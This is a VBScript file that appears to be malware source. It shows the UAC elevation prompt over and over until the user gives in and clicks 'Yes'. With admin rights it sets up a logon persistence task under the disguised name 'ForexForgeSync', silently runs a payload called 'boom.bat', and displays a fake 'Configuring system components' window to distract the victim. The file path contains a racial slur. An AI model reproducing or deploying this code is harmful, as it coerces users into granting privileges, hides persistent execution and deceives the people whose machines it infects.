Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' --- CONFIGURATION ---
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
strScript = strPath & "\launcher.vbs"
WshShell.CurrentDirectory = strPath

' --- STEP 1: THE PERSISTENT UAC LOOP ---
' This starts as soon as the PC reboots. 
' If the user clicks "No", it loops and asks again instantly.
If Not WScript.Arguments.Named.Exists("elevate") Then
    Do
        On Error Resume Next
        ' Trigger UAC. If they click "No", Err.Number will not be 0.
        UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
        
        ' If they clicked "Yes", the new elevated process starts and we can exit this loop.
        If Err.Number = 0 Then Exit Do 
        On Error GoTo 0
        
        ' 0.5 second pause so the CPU doesn't lag while they fight the prompt.
        WScript.Sleep 500 
    Loop
    WScript.Quit
End If

' --- STEP 2: RUNNING WITH ADMIN (After "Yes" is clicked) ---
' This part only runs once the user has finally clicked "Yes".
If WScript.Arguments.Named.Exists("elevate") Then

    ' 1. Re-register the task (to ensure it stays persistent)
    strTaskName = "ForexForgeSync"
    strRunCmd = "wscript.exe //B """ & strScript & """"
    strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /f"
    WshShell.Run "cmd.exe /c " & strCreateTask, 0, True
    
    ' 2. Run the background payload (boom.bat)
    If FSO.FileExists(strPath & "\boom.bat") Then
        WshShell.Run "cmd.exe /c boom.bat", 0, True
    End If

    ' 3. Show the 30-second distraction window
    ' This only appears AFTER they click "Yes" to the UAC.
    startTime = Timer
    Do While Timer < startTime + 10
        ' Re-launches the blue window if they try to close it
        WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Configuring system components... Please wait. && echo  Do not close this window to avoid system errors. && timeout /t 30 /nobreak > nul", 1, True
        
        If Timer < startTime + 10 Then 
            WScript.Sleep 100 
        End If
    Loop
End If

WScript.Quit
